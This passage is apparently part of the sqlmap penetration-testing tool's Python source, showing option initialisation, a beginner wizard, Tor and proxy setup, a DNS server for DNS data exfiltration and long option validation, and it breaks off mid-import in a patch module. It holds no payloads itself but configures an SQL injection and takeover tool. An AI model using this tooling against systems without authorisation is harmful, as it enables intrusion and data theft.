kb.reflectiveMechanism = True\n    kb.reflectiveCounters = {REFLECTIVE_COUNTER.MISS: 0, REFLECTIVE_COUNTER.HIT: 0}\n    kb.requestCounter = 0\n    kb.resendPostOnRedirect = None\n    kb.resolutionDbms = None\n    kb.responseTimes = {}\n    kb.responseTimeMode = None\n    kb.responseTimePayload = None\n    kb.resumeValues = True\n    kb.safeCharEncode = False\n    kb.safeReq = AttribDict()\n    kb.secondReq = None\n    kb.serverHeader = None\n    kb.singleLogFlags = set()\n    kb.skipSeqMatcher = False\n    kb.smokeMode = False\n    kb.reduceTests = None\n    kb.sslSuccess = False\n    kb.startTime = time.time()\n    kb.stickyDBMS = False\n    kb.suppressResumeInfo = False\n    kb.tableFrom = None\n    kb.technique = None\n    kb.tempDir = None\n    kb.testMode = False\n    kb.testOnlyCustom = False\n    kb.testQueryCount = 0\n    kb.testType = None\n    kb.threadContinue = True\n    kb.threadException = False\n    kb.uChar = NULL\n    kb.udfFail = False\n    kb.unionDuplicates = False\n    kb.unionTemplate = None\n    kb.webSocketRecvCount = None\n    kb.wizardMode = False\n    kb.xpCmdshellAvailable = False\n\n    if flushAll:\n        kb.checkSitemap = None\n        kb.headerPaths = {}\n        kb.keywords = set(getFileItems(paths.SQL_KEYWORDS))\n        kb.lastCtrlCTime = None\n        kb.normalizeCrawlingChoice = None\n        kb.passwordMgr = None\n        kb.postprocessFunctions = []\n        kb.preprocessFunctions = []\n        kb.skipVulnHost = None\n        kb.storeCrawlingChoice = None\n        kb.tamperFunctions = []\n        kb.targets = OrderedSet()\n        kb.testedParams = set()\n        kb.userAgents = None\n        kb.vainRun = True\n        kb.vulnHosts = set()\n        kb.wafFunctions = []\n        kb.wordlists = None\n\ndef _useWizardInterface():\n    \"\"\"\n    Presents simple wizard interface for beginner users\n    \"\"\"\n\n    if not conf.wizard:\n        return\n\n    logger.info(\"starting wizard interface\")\n\n    while not conf.url:\n        message = \"Please enter full target URL (-u): \"\n        conf.url = readInput(message, default=None, checkBatch=False)\n\n    message = \"%s data (--data) [Enter for None]: \" % ((conf.method if conf.method != HTTPMETHOD.GET else None) or HTTPMETHOD.POST)\n    conf.data = readInput(message, default=None)\n\n    if not (any('=' in _ for _ in (conf.url, conf.data)) or '*' in conf.url):\n        warnMsg = \"no GET and/or %s parameter(s) found for testing \" % ((conf.method if conf.method != HTTPMETHOD.GET else None) or HTTPMETHOD.POST)\n        warnMsg += \"(e.g. GET parameter 'id' in 'http://www.site.com/vuln.php?id=1'). \"\n        if not conf.crawlDepth and not conf.forms:\n            warnMsg += \"Will search for forms\"\n            conf.forms = True\n        logger.warning(warnMsg)\n\n    choice = None\n\n    while choice is None or choice not in (\"\", \"1\", \"2\", \"3\"):\n        message = \"Injection difficulty (--level/--risk). Please choose:\\n\"\n        message += \"[1] Normal (default)\\n[2] Medium\\n[3] Hard\"\n        choice = readInput(message, default='1')\n\n        if choice == '2':\n            conf.risk = 2\n            conf.level = 3\n        elif choice == '3':\n            conf.risk = 3\n            conf.level = 5\n        else:\n            conf.risk = 1\n            conf.level = 1\n\n    if not conf.getAll:\n        choice = None\n\n        while choice is None or choice not in (\"\", \"1\", \"2\", \"3\"):\n            message = \"Enumeration (--banner/--current-user/etc). Please choose:\\n\"\n            message += \"[1] Basic (default)\\n[2] Intermediate\\n[3] All\"\n            choice = readInput(message, default='1')\n\n            if choice == '2':\n                options = WIZARD.INTERMEDIATE\n            elif choice == '3':\n                options = WIZARD.ALL\n            else:\n                options = WIZARD.BASIC\n\n            for _ in options:\n                conf.__setitem__(_, True)\n\n    logger.debug(\"muting sqlmap.. it will do the magic for you\")\n    conf.verbose = 0\n\n    conf.batch = True\n    conf.threads = 4\n\n    dataToStdout(\"\\nsqlmap is running, please wait..\\n\\n\")\n\n    kb.wizardMode = True\n\ndef _saveConfig():\n    \"\"\"\n    Saves the command line options to a sqlmap configuration INI file\n    Format.\n    \"\"\"\n\n    if not conf.saveConfig:\n        return\n\n    debugMsg = \"saving command line options to a sqlmap configuration INI file\"\n    logger.debug(debugMsg)\n\n    saveConfig(conf, conf.saveConfig)\n\n    infoMsg = \"saved command line options to the configuration file '%s'\" % conf.saveConfig\n    logger.info(infoMsg)\n\ndef setVerbosity():\n    \"\"\"\n    This function set the verbosity of sqlmap output messages.\n    \"\"\"\n\n    if conf.verbose is None:\n        conf.verbose = 1\n\n    conf.verbose = int(conf.verbose)\n\n    if conf.verbose == 0:\n        logger.setLevel(logging.ERROR)\n    elif conf.verbose == 1:\n        logger.setLevel(logging.INFO)\n    elif conf.verbose > 2 and conf.eta:\n        conf.verbose = 2\n        logger.setLevel(logging.DEBUG)\n    elif conf.verbose == 2:\n        logger.setLevel(logging.DEBUG)\n    elif conf.verbose == 3:\n        logger.setLevel(CUSTOM_LOGGING.PAYLOAD)\n    elif conf.verbose == 4:\n        logger.setLevel(CUSTOM_LOGGING.TRAFFIC_OUT)\n    elif conf.verbose >= 5:\n        logger.setLevel(CUSTOM_LOGGING.TRAFFIC_IN)\n\ndef _normalizeOptions(inputOptions):\n    \"\"\"\n    Sets proper option types\n    \"\"\"\n\n    types_ = {}\n    for group in optDict.keys():\n        types_.update(optDict[group])\n\n    for key in inputOptions:\n        if key in types_:\n            value = inputOptions[key]\n            if value is None:\n                continue\n\n            type_ = types_[key]\n            if type_ and isinstance(type_, tuple):\n                type_ = type_[0]\n\n            if type_ == OPTION_TYPE.BOOLEAN:\n                try:\n                    value = bool(value)\n                except (TypeError, ValueError):\n                    value = False\n            elif type_ == OPTION_TYPE.INTEGER:\n                try:\n                    value = int(value)\n                except (TypeError, ValueError):\n                    value = 0\n            elif type_ == OPTION_TYPE.FLOAT:\n                try:\n                    value = float(value)\n                except (TypeError, ValueError):\n                    value = 0.0\n\n            inputOptions[key] = value\n\ndef _mergeOptions(inputOptions, overrideOptions):\n    \"\"\"\n    Merge command line options with configuration file and default options.\n\n    @param inputOptions: optparse object with command line options.\n    @type inputOptions: C{instance}\n    \"\"\"\n\n    if inputOptions.configFile:\n        configFileParser(inputOptions.configFile)\n\n    if hasattr(inputOptions, \"items\"):\n        inputOptionsItems = inputOptions.items()\n    else:\n        inputOptionsItems = inputOptions.__dict__.items()\n\n    for key, value in inputOptionsItems:\n        if key not in conf or value not in (None, False) or overrideOptions:\n            conf[key] = value\n\n    if not conf.api:\n        for key, value in conf.items():\n            if value is not None:\n                kb.explicitSettings.add(key)\n\n    for key, value in defaults.items():\n        if hasattr(conf, key) and conf[key] is None:\n            conf[key] = value\n\n            if conf.unstable:\n                if key in (\"timeSec\", \"retries\", \"timeout\"):\n                    conf[key] *= 2\n\n    if conf.unstable:\n        conf.forcePartial = True\n\n    lut = {}\n    for group in optDict.keys():\n        lut.update((_.upper(), _) for _ in optDict[group])\n\n    envOptions = {}\n    for key, value in os.environ.items():\n        if key.upper().startswith(SQLMAP_ENVIRONMENT_PREFIX):\n            _ = key[len(SQLMAP_ENVIRONMENT_PREFIX):].upper()\n            if _ in lut:\n                envOptions[lut[_]] = value\n\n    if envOptions:\n        _normalizeOptions(envOptions)\n        for key, value in envOptions.items():\n            conf[key] = value\n\n    mergedOptions.update(conf)\n\ndef _setTrafficOutputFP():\n    if conf.trafficFile:\n        infoMsg = \"setting file for logging HTTP traffic\"\n        logger.info(infoMsg)\n\n        conf.trafficFP = openFile(conf.trafficFile, \"w+\")\n\ndef _setupHTTPCollector():\n    if not conf.harFile:\n        return\n\n    conf.httpCollector = HTTPCollectorFactory(conf.harFile).create()\n\ndef _setDNSServer():\n    if not conf.dnsDomain:\n        return\n\n    infoMsg = \"setting up DNS server instance\"\n    logger.info(infoMsg)\n\n    isAdmin = runningAsAdmin()\n\n    if isAdmin:\n        try:\n            conf.dnsServer = DNSServer()\n            conf.dnsServer.run()\n        except socket.error as ex:\n            errMsg = \"there was an error while setting up \"\n            errMsg += \"DNS server instance ('%s')\" % getSafeExString(ex)\n            raise SqlmapGenericException(errMsg)\n    else:\n        errMsg = \"you need to run sqlmap as an administrator \"\n        errMsg += \"if you want to perform a DNS data exfiltration attack \"\n        errMsg += \"as it will need to listen on privileged UDP port 53 \"\n        errMsg += \"for incoming address resolution attempts\"\n        raise SqlmapMissingPrivileges(errMsg)\n\ndef _setProxyList():\n    if not conf.proxyFile:\n        return\n\n    conf.proxyList = []\n    for match in re.finditer(r\"(?i)((http[^:]*|socks[^:]*)://)?([\\w\\-.]+):(\\d+)\", readCachedFileContent(conf.proxyFile)):\n        _, type_, address, port = match.groups()\n        conf.proxyList.append(\"%s://%s:%s\" % (type_ or \"http\", address, port))\n\ndef _setTorProxySettings():\n    if not conf.tor:\n        return\n\n    if conf.torType == PROXY_TYPE.HTTP:\n        _setTorHttpProxySettings()\n    else:\n        _setTorSocksProxySettings()\n\ndef _setTorHttpProxySettings():\n    infoMsg = \"setting Tor HTTP proxy settings\"\n    logger.info(infoMsg)\n\n    port = findLocalPort(DEFAULT_TOR_HTTP_PORTS if not conf.torPort else (conf.torPort,))\n\n    if port:\n        conf.proxy = \"http://%s:%d\" % (LOCALHOST, port)\n    else:\n        errMsg = \"can't establish connection with the Tor HTTP proxy. \"\n        errMsg += \"Please make sure that you have Tor (bundle) installed and setup \"\n        errMsg += \"so you could be able to successfully use switch '--tor' \"\n        raise SqlmapConnectionException(errMsg)\n\n    if not conf.checkTor:\n        warnMsg = \"use switch '--check-tor' at \"\n        warnMsg += \"your own convenience when accessing \"\n        warnMsg += \"Tor anonymizing network because of \"\n        warnMsg += \"known issues with default settings of various 'bundles' \"\n        warnMsg += \"(e.g. Vidalia)\"\n        logger.warning(warnMsg)\n\ndef _setTorSocksProxySettings():\n    infoMsg = \"setting Tor SOCKS proxy settings\"\n    logger.info(infoMsg)\n\n    port = findLocalPort(DEFAULT_TOR_SOCKS_PORTS if not conf.torPort else (conf.torPort,))\n\n    if not port:\n        errMsg = \"can't establish connection with the Tor SOCKS proxy. \"\n        errMsg += \"Please make sure that you have Tor service installed and setup \"\n        errMsg += \"so you could be able to successfully use switch '--tor' \"\n        raise SqlmapConnectionException(errMsg)\n\n    # SOCKS5 to prevent DNS leaks (http://en.wikipedia.org/wiki/Tor_%28anonymity_network%29)\n    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5 if conf.torType == PROXY_TYPE.SOCKS5 else socks.PROXY_TYPE_SOCKS4, LOCALHOST, port)\n    socks.wrapmodule(_http_client)\n\ndef _setHttpChunked():\n    if conf.chunked and conf.data:\n        if hasattr(_http_client.HTTPConnection, \"_set_content_length\"):\n            _http_client.HTTPConnection._set_content_length = lambda self, *args, **kwargs: None\n        else:\n            def putheader(self, header, *values):\n                if header != HTTP_HEADER.CONTENT_LENGTH:\n                    self._putheader(header, *values)\n\n            if not hasattr(_http_client.HTTPConnection, \"_putheader\"):\n                _http_client.HTTPConnection._putheader = _http_client.HTTPConnection.putheader\n\n            _http_client.HTTPConnection.putheader = putheader\n\ndef _checkWebSocket():\n    if conf.url and (conf.url.startswith(\"ws:/\") or conf.url.startswith(\"wss:/\")):\n        try:\n            from websocket import ABNF\n        except ImportError:\n            errMsg = \"sqlmap requires third-party module 'websocket-client' \"\n            errMsg += \"in order to use WebSocket functionality\"\n            raise SqlmapMissingDependence(errMsg)\n\ndef _checkTor():\n    if not conf.checkTor:\n        return\n\n    infoMsg = \"checking Tor connection\"\n    logger.info(infoMsg)\n\n    try:\n        page, _, _ = Request.getPage(url=\"https://check.torproject.org/\", raise404=False)\n    except SqlmapConnectionException:\n        page = None\n\n    if not page or \"Congratulations\" not in page:\n        errMsg = \"it appears that Tor is not properly set. Please try using options '--tor-type' and/or '--tor-port'\"\n        raise SqlmapConnectionException(errMsg)\n    else:\n        infoMsg = \"Tor is properly being used\"\n        logger.info(infoMsg)\n\ndef _basicOptionValidation():\n    if conf.limitStart is not None and not (isinstance(conf.limitStart, int) and conf.limitStart > 0):\n        errMsg = \"value for option '--start' (limitStart) must be an integer value greater than zero (>0)\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.limitStop is not None and not (isinstance(conf.limitStop, int) and conf.limitStop > 0):\n        errMsg = \"value for option '--stop' (limitStop) must be an integer value greater than zero (>0)\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.level is not None and not (isinstance(conf.level, int) and conf.level >= 1 and conf.level <= 5):\n        errMsg = \"value for option '--level' must be an integer value from range [1, 5]\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.risk is not None and not (isinstance(conf.risk, int) and conf.risk >= 1 and conf.risk <= 3):\n        errMsg = \"value for option '--risk' must be an integer value from range [1, 3]\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if isinstance(conf.limitStart, int) and conf.limitStart > 0 and \\\n       isinstance(conf.limitStop, int) and conf.limitStop < conf.limitStart:\n        warnMsg = \"usage of option '--start' (limitStart) which is bigger than value for --stop (limitStop) option is considered unstable\"\n        logger.warning(warnMsg)\n\n    if isinstance(conf.firstChar, int) and conf.firstChar > 0 and \\\n       isinstance(conf.lastChar, int) and conf.lastChar < conf.firstChar:\n        errMsg = \"value for option '--first' (firstChar) must be smaller than or equal to value for --last (lastChar) option\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.proxyFile and not any((conf.randomAgent, conf.mobile, conf.agent, conf.requestFile)):\n        warnMsg = \"usage of switch '--random-agent' is strongly recommended when \"\n        warnMsg += \"using option '--proxy-file'\"\n        logger.warning(warnMsg)\n\n    if conf.textOnly and conf.nullConnection:\n        errMsg = \"switch '--text-only' is incompatible with switch '--null-connection'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.uValues and conf.uChar:\n        errMsg = \"option '--union-values' is incompatible with option '--union-char'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.base64Parameter and conf.tamper:\n        errMsg = \"option '--base64' is incompatible with option '--tamper'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.eta and conf.verbose > defaults.verbose:\n        errMsg = \"switch '--eta' is incompatible with option '-v'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.secondUrl and conf.secondReq:\n        errMsg = \"option '--second-url' is incompatible with option '--second-req')\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.direct and conf.url:\n        errMsg = \"option '-d' is incompatible with option '-u' ('--url')\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.direct and conf.dbms:\n        errMsg = \"option '-d' is incompatible with option '--dbms'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.titles and conf.nullConnection:\n        errMsg = \"switch '--titles' is incompatible with switch '--null-connection'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.dumpTable and conf.search:\n        errMsg = \"switch '--dump' is incompatible with switch '--search'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.chunked and not any((conf.data, conf.requestFile, conf.forms)):\n        errMsg = \"switch '--chunked' requires usage of (POST) options/switches '--data', '-r' or '--forms'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.api and not conf.configFile:\n        errMsg = \"switch '--api' requires usage of option '-c'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.data and conf.nullConnection:\n        errMsg = \"option '--data' is incompatible with switch '--null-connection'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.string and conf.nullConnection:\n        errMsg = \"option '--string' is incompatible with switch '--null-connection'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.notString and conf.nullConnection:\n        errMsg = \"option '--not-string' is incompatible with switch '--null-connection'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.tor and conf.osPwn:\n        errMsg = \"option '--tor' is incompatible with switch '--os-pwn'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.noCast and conf.hexConvert:\n        errMsg = \"switch '--no-cast' is incompatible with switch '--hex'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.crawlDepth:\n        try:\n            xrange(conf.crawlDepth)\n        except OverflowError as ex:\n            errMsg = \"invalid value used for option '--crawl' ('%s')\" % getSafeExString(ex)\n            raise SqlmapSyntaxException(errMsg)\n\n    if conf.dumpAll and conf.search:\n        errMsg = \"switch '--dump-all' is incompatible with switch '--search'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.string and conf.notString:\n        errMsg = \"option '--string' is incompatible with switch '--not-string'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.regexp and conf.nullConnection:\n        errMsg = \"option '--regexp' is incompatible with switch '--null-connection'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.regexp:\n        try:\n            re.compile(conf.regexp)\n        except Exception as ex:\n            errMsg = \"invalid regular expression '%s' ('%s')\" % (conf.regexp, getSafeExString(ex))\n            raise SqlmapSyntaxException(errMsg)\n\n    if conf.paramExclude:\n        if re.search(r\"\\A\\w+,\", conf.paramExclude):\n            conf.paramExclude = r\"\\A(%s)\\Z\" % ('|'.join(re.escape(_).strip() for _ in conf.paramExclude.split(',')))\n\n        try:\n            re.compile(conf.paramExclude)\n        except Exception as ex:\n            errMsg = \"invalid regular expression '%s' ('%s')\" % (conf.paramExclude, getSafeExString(ex))\n            raise SqlmapSyntaxException(errMsg)\n\n    if conf.retryOn:\n        try:\n            re.compile(conf.retryOn)\n        except Exception as ex:\n            errMsg = \"invalid regular expression '%s' ('%s')\" % (conf.retryOn, getSafeExString(ex))\n            raise SqlmapSyntaxException(errMsg)\n\n        if conf.retries == defaults.retries:\n            conf.retries = 5 * conf.retries\n\n            warnMsg = \"increasing default value for \"\n            warnMsg += \"option '--retries' to %d because \" % conf.retries\n            warnMsg += \"option '--retry-on' was provided\"\n            logger.warning(warnMsg)\n\n\n    if conf.cookieDel and len(conf.cookieDel) != 1:\n        errMsg = \"option '--cookie-del' should contain a single character (e.g. ';')\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.crawlExclude:\n        try:\n            re.compile(conf.crawlExclude)\n        except Exception as ex:\n            errMsg = \"invalid regular expression '%s' ('%s')\" % (conf.crawlExclude, getSafeExString(ex))\n            raise SqlmapSyntaxException(errMsg)\n\n    if conf.scope:\n        try:\n            re.compile(conf.scope)\n        except Exception as ex:\n            errMsg = \"invalid regular expression '%s' ('%s')\" % (conf.scope, getSafeExString(ex))\n            raise SqlmapSyntaxException(errMsg)\n\n    if conf.dumpTable and conf.dumpAll:\n        errMsg = \"switch '--dump' is incompatible with switch '--dump-all'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.predictOutput and (conf.threads > 1 or conf.optimize):\n        errMsg = \"switch '--predict-output' is incompatible with option '--threads' and switch '-o'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.threads > MAX_NUMBER_OF_THREADS and not conf.get(\"skipThreadCheck\"):\n        errMsg = \"maximum number of used threads is %d avoiding potential connection issues\" % MAX_NUMBER_OF_THREADS\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.forms and not any((conf.url, conf.googleDork, conf.bulkFile)):\n        errMsg = \"switch '--forms' requires usage of option '-u' ('--url'), '-g' or '-m'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.crawlExclude and not conf.crawlDepth:\n        errMsg = \"option '--crawl-exclude' requires usage of switch '--crawl'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.safePost and not conf.safeUrl:\n        errMsg = \"option '--safe-post' requires usage of option '--safe-url'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.safeFreq and not any((conf.safeUrl, conf.safeReqFile)):\n        errMsg = \"option '--safe-freq' requires usage of option '--safe-url' or '--safe-req'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.safeReqFile and any((conf.safeUrl, conf.safePost)):\n        errMsg = \"option '--safe-req' is incompatible with option '--safe-url' and option '--safe-post'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.csrfUrl and not conf.csrfToken:\n        errMsg = \"option '--csrf-url' requires usage of option '--csrf-token'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.csrfMethod and not conf.csrfToken:\n        errMsg = \"option '--csrf-method' requires usage of option '--csrf-token'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.csrfData and not conf.csrfToken:\n        errMsg = \"option '--csrf-data' requires usage of option '--csrf-token'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.csrfToken and conf.threads > 1:\n        errMsg = \"option '--csrf-url' is incompatible with option '--threads'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.requestFile and conf.url and conf.url != DUMMY_URL:\n        errMsg = \"option '-r' is incompatible with option '-u' ('--url')\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.direct and conf.proxy:\n        errMsg = \"option '-d' is incompatible with option '--proxy'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.direct and conf.tor:\n        errMsg = \"option '-d' is incompatible with switch '--tor'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if not conf.technique:\n        errMsg = \"option '--technique' can't be empty\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.tor and conf.ignoreProxy:\n        errMsg = \"switch '--tor' is incompatible with switch '--ignore-proxy'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.tor and conf.proxy:\n        errMsg = \"switch '--tor' is incompatible with option '--proxy'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.proxy and conf.proxyFile:\n        errMsg = \"switch '--proxy' is incompatible with option '--proxy-file'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.proxyFreq and not conf.proxyFile:\n        errMsg = \"option '--proxy-freq' requires usage of option '--proxy-file'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.checkTor and not any((conf.tor, conf.proxy)):\n        errMsg = \"switch '--check-tor' requires usage of switch '--tor' (or option '--proxy' with HTTP proxy address of Tor service)\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.torPort is not None and not (isinstance(conf.torPort, int) and conf.torPort >= 0 and conf.torPort <= 65535):\n        errMsg = \"value for option '--tor-port' must be in range [0, 65535]\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.torType not in getPublicTypeMembers(PROXY_TYPE, True):\n        errMsg = \"option '--tor-type' accepts one of following values: %s\" % \", \".join(getPublicTypeMembers(PROXY_TYPE, True))\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.dumpFormat not in getPublicTypeMembers(DUMP_FORMAT, True):\n        errMsg = \"option '--dump-format' accepts one of following values: %s\" % \", \".join(getPublicTypeMembers(DUMP_FORMAT, True))\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.uValues and (not re.search(r\"\\A['\\w\\s.,()%s-]+\\Z\" % CUSTOM_INJECTION_MARK_CHAR, conf.uValues) or conf.uValues.count(CUSTOM_INJECTION_MARK_CHAR) != 1):\n        errMsg = \"option '--union-values' must contain valid UNION column values, along with the injection position \"\n        errMsg += \"(e.g. 'NULL,1,%s,NULL')\" % CUSTOM_INJECTION_MARK_CHAR\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.skip and conf.testParameter:\n        if intersect(conf.skip, conf.testParameter):\n            errMsg = \"option '--skip' is incompatible with option '-p'\"\n            raise SqlmapSyntaxException(errMsg)\n\n    if conf.rParam and conf.testParameter:\n        if intersect(conf.rParam, conf.testParameter):\n            errMsg = \"option '--randomize' is incompatible with option '-p'\"\n            raise SqlmapSyntaxException(errMsg)\n\n    if conf.mobile and conf.agent:\n        errMsg = \"switch '--mobile' is incompatible with option '--user-agent'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.proxy and conf.ignoreProxy:\n        errMsg = \"option '--proxy' is incompatible with switch '--ignore-proxy'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.alert and conf.alert.startswith('-'):\n        errMsg = \"value for option '--alert' must be valid operating system command(s)\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.timeSec < 1:\n        errMsg = \"value for option '--time-sec' must be a positive integer\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.hashFile and any((conf.direct, conf.url, conf.logFile, conf.bulkFile, conf.googleDork, conf.configFile, conf.requestFile, conf.updateAll, conf.smokeTest, conf.wizard, conf.dependencies, conf.purge, conf.listTampers)):\n        errMsg = \"option '--crack' should be used as a standalone\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if isinstance(conf.uCols, six.string_types):\n        if not conf.uCols.isdigit() and (\"-\" not in conf.uCols or len(conf.uCols.split(\"-\")) != 2):\n            errMsg = \"value for option '--union-cols' must be a range with hyphon \"\n            errMsg += \"(e.g. 1-10) or integer value (e.g. 5)\"\n            raise SqlmapSyntaxException(errMsg)\n\n    if conf.dbmsCred and ':' not in conf.dbmsCred:\n        errMsg = \"value for option '--dbms-cred' must be in \"\n        errMsg += \"format <username>:<password> (e.g. \\\"root:pass\\\")\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if conf.encoding:\n        _ = checkCharEncoding(conf.encoding, False)\n        if _ is None:\n            errMsg = \"unknown encoding '%s'. Please visit \" % conf.encoding\n            errMsg += \"'%s' to get the full list of \" % CODECS_LIST_PAGE\n            errMsg += \"supported encodings\"\n            raise SqlmapSyntaxException(errMsg)\n        else:\n            conf.encoding = _\n\n    if conf.fileWrite and not os.path.isfile(conf.fileWrite):\n        errMsg = \"file '%s' does not exist\" % os.path.abspath(conf.fileWrite)\n        raise SqlmapFilePathException(errMsg)\n\n    if conf.loadCookies and not os.path.exists(conf.loadCookies):\n        errMsg = \"cookies file '%s' does not exist\" % os.path.abspath(conf.loadCookies)\n        raise SqlmapFilePathException(errMsg)\n\ndef initOptions(inputOptions=AttribDict(), overrideOptions=False):\n    _setConfAttributes()\n    _setKnowledgeBaseAttributes()\n    _mergeOptions(inputOptions, overrideOptions)\n\ndef init():\n    \"\"\"\n    Set attributes into both configuration and knowledge base singletons\n    based upon command line and configuration file options.\n    \"\"\"\n\n    _useWizardInterface()\n    setVerbosity()\n    _saveConfig()\n    _setRequestFromFile()\n    _cleanupOptions()\n    _cleanupEnvironment()\n    _purge()\n    _checkDependencies()\n    _createHomeDirectories()\n    _createTemporaryDirectory()\n    _basicOptionValidation()\n    _setProxyList()\n    _setTorProxySettings()\n    _setDNSServer()\n    _adjustLoggingFormatter()\n    _setMultipleTargets()\n    _listTamperingFunctions()\n    _setTamperingFunctions()\n    _setPreprocessFunctions()\n    _setPostprocessFunctions()\n    _setTrafficOutputFP()\n    _setupHTTPCollector()\n    _setHttpChunked()\n    _checkWebSocket()\n\n    parseTargetDirect()\n\n    if any((conf.url, conf.logFile, conf.bulkFile, conf.requestFile, conf.googleDork, conf.stdinPipe)):\n        _setHostname()\n        _setHTTPTimeout()\n        _setHTTPExtraHeaders()\n        _setHTTPCookies()\n        _setHTTPReferer()\n        _setHTTPHost()\n        _setHTTPUserAgent()\n        _setHTTPAuthentication()\n        _setHTTPHandlers()\n        _setDNSCache()\n        _setSocketPreConnect()\n        _setSafeVisit()\n        _doSearch()\n        _setStdinPipeTargets()\n        _setBulkMultipleTargets()\n        _checkTor()\n        _setCrawler()\n        _findPageForms()\n        _setDBMS()\n        _setTechnique()\n\n    _setThreads()\n    _setOS()\n    _setWriteFile()\n    _setMetasploit()\n    _setDBMSAuthentication()\n    loadBoundaries()\n    loadPayloads()\n    _setPrefixSuffix()\n    update()\n    _loadQueries()\n", "lib/core/revision.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport re\nimport subprocess\n\nfrom lib.core.common import openFile\nfrom lib.core.convert import getText\n\ndef getRevisionNumber():\n    \"\"\"\n    Returns abbreviated commit hash number as retrieved with \"git rev-parse --short HEAD\"\n\n    >>> len(getRevisionNumber() or (' ' * 7)) == 7\n    True\n    \"\"\"\n\n    retVal = None\n    filePath = None\n    _ = os.path.dirname(__file__)\n\n    while True:\n        filePath = os.path.join(_, \".git\", \"HEAD\")\n        if os.path.exists(filePath):\n            break\n        else:\n            filePath = None\n            if _ == os.path.dirname(_):\n                break\n            else:\n                _ = os.path.dirname(_)\n\n    while True:\n        if filePath and os.path.isfile(filePath):\n            with openFile(filePath, \"r\") as f:\n                content = getText(f.read())\n                filePath = None\n\n                if content.startswith(\"ref: \"):\n                    try:\n                        filePath = os.path.join(_, \".git\", content.replace(\"ref: \", \"\")).strip()\n                    except UnicodeError:\n                        pass\n\n                if filePath is None:\n                    match = re.match(r\"(?i)[0-9a-f]{32}\", content)\n                    retVal = match.group(0) if match else None\n                    break\n        else:\n            break\n\n    if not retVal:\n        try:\n            process = subprocess.Popen(\"git rev-parse --verify HEAD\", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            stdout, _ = process.communicate()\n            match = re.search(r\"(?i)[0-9a-f]{32}\", getText(stdout or \"\"))\n            retVal = match.group(0) if match else None\n        except:\n            pass\n\n    return retVal[:7] if retVal else None\n", "lib/core/patch.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport codecs\nimport collections\nimport inspect\nimport logging\nimport os\nimport random\nimport re\nimport sys\n\nimport lib.controller.checks\nimport lib.core.common\nimport lib.core.convert\nimport lib.core.option\nimport lib.core.threads\nimport lib.request.connect\nimport lib.utils.search\nimport lib.utils.sqlalchemy\nimport thirdparty.ansistrm.ansistrm\nimport thirdparty.chardet.universaldetector\n\nfrom lib.core.common import filterNone\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import isDigit\nfrom lib.core.common import isListLike\nfrom lib.core.common import readInput\nfrom lib.core.common import shellExec\nfrom lib.core.common import 